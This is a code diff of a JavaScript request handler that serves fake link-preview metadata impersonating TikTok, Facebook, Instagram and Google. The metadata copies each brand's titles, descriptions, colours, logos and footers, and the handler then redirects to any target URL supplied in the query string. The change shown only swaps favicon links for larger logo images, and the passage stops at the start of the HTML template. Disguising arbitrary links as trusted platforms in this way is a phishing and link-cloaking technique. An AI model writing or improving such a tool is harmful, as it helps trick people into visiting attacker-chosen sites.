@@ -1,32 +1,32 @@
 export default function handler(req, res) {
     const { name, target } = req.query;
-    
+
     const configs = {
         'TikTok': {
             title: 'TikTok - Watch Trending Videos',
             desc: 'Join the millions of viewers discovering content and creators on TikTok.',
-            image: 'https://www.tiktok.com/favicon.ico',
+            image: 'https://cdn.pixabay.com/photo/2021/01/30/06/42/tiktok-5962992_1280.png',
             color: '#fe2c55',
             footer: 'TikTok Inc. 2024'
         },
         'Facebook': {
             title: 'Facebook - Log In or Sign Up',
             desc: 'Create an account or log into Facebook. Connect with friends, family and other people you know.',
-            image: 'https://www.facebook.com/favicon.ico',
+            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png',
             color: '#0866ff',
             footer: 'Meta © 2024'
         },
         'Instagram': {
             title: 'Instagram',
             desc: 'Watch the latest reels and photos from your favorite creators.',
-            image: 'https://www.instagram.com/favicon.ico',
+            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png',
             color: '#e4405f',
             footer: 'Meta © 2024'
         },
         'Google': {
             title: 'Google Search',
             desc: 'Search the world\'s information, including webpages, images, videos and more.',
-            image: 'https://www.google.com/favicon.ico',
+            image: 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Refined_Icons_Search_Color.png/600px-Google_Refined_Icons_Search_Color.png',
             color: '#4285f4',
             footer: 'Google LLC 2024'
         }
@@ -35,7 +35,7 @@ export default function handler(req, res) {
     const platform = name || 'TikTok';
     const cfg = configs[platform] || configs['TikTok'];
     const redirectTarget = target || 'https://www.google.com';
-    
+
     const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
